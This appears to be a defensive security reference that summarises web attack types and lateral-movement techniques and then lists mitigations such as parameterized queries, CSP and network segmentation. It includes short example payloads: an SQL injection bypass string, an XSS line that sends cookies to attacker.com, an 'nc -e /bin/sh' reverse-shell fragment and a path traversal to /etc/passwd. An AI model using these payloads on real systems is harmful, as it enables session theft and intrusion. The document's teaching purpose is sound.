# Web Attacks, Infiltration & Lateral Movement

## Overview
Web application attacks exploit vulnerabilities in HTTP/HTTPS software layers (OWASP Top 10) to compromise web services, extract backend data, or obtain initial network access.

Following initial compromise, adversaries execute Infiltration and Lateral Movement (MITRE ATT&CK T1210 / T1021) to expand their presence across enterprise internal network segments.

---

## Key Web Application Attack Vectors

### 1. SQL Injection (SQLi - OWASP A03:2021)
- **Mechanism:** Inserting untrusted SQL syntax into input fields (e.g., `' OR '1'='1' --`) to manipulate database query logic, bypass authentication, or dump database contents (`UNION SELECT`).
- **Indicators:** High prevalence of SQL keywords (`SELECT`, `UNION`, `CONCAT`, `information_schema`) inside HTTP request parameters or URIs.

### 2. Cross-Site Scripting (XSS - OWASP A03:2021)
- **Mechanism:** Injecting malicious JavaScript payloads (e.g., `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`) executed within a victim user's browser context.
- **Types:** Stored XSS, Reflected XSS, DOM-based XSS.

### 3. Command Injection & Remote Code Execution (RCE)
- **Mechanism:** Appending shell metacharacters (`;`, `&&`, `|`, `$(...)`) into backend operating system command executions to spawn reverse shells (`nc -e /bin/sh`).

### 4. Path Traversal & Local File Inclusion (LFI)
- **Mechanism:** Supplying directory climbing sequences (`../../../../etc/passwd` or `..\..\..\windows\system32\cmd.exe`) to access unauthorized server filesystem resources.

---

## Infiltration & Lateral Movement Vectors

### 1. SMB / RPC Exploitation (e.g., EternalBlue MS17-010)
- Exploiting vulnerabilities in Windows SMBv1/v2 (port 445) to execute kernel-level code and pivot across Windows domain controllers and workstations without credentials.

### 2. Pass-the-Hash & Pass-the-Ticket (T1550)
- Reusing captured NTLM hashes or Kerberos tickets to authenticate to adjacent network hosts over SMB/WinRM without cracking the plaintext password.

### 3. Remote Services & Protocols
- Using valid stolen credentials across SSH (port 22), RDP (port 3389), WinRM (ports 5985/5986), or WMI.

---

## Defensive Mitigation Strategies

### Web Application Protection
1. **Parameterized Queries / Prepared Statements:** Mandatory use of parameterized SQL APIs (e.g., PDO in PHP, parameterized ORMs) to guarantee input is treated strictly as data, not executable code.
2. **Web Application Firewall (WAF):** Deploy OWASP Core Rule Set (CRS) on ModSecurity, AWS WAF, or Cloudflare WAF to inspect L7 traffic payloads and block attack patterns.
3. **Content Security Policy (CSP):** Enforce strict CSP headers (`Content-Security-Policy: default-src 'self'; script-src 'self'`) to neutralize XSS execution.

### Lateral Movement Countermeasures
1. **Network Micro-Segmentation:** Isolate internal endpoints; disallow workstation-to-workstation lateral communications over ports 445 (SMB), 135 (RPC), and 3389 (RDP).
2. **Privileged Access Management (PAM):** Implement Tiered Administration models (Tier 0 Domain Controllers, Tier 1 Servers, Tier 2 Workstations) ensuring Tier 0 credentials never touch lower-tier systems.
3. **Disable SMBv1:** Eliminate legacy SMBv1 protocols across all domain systems.
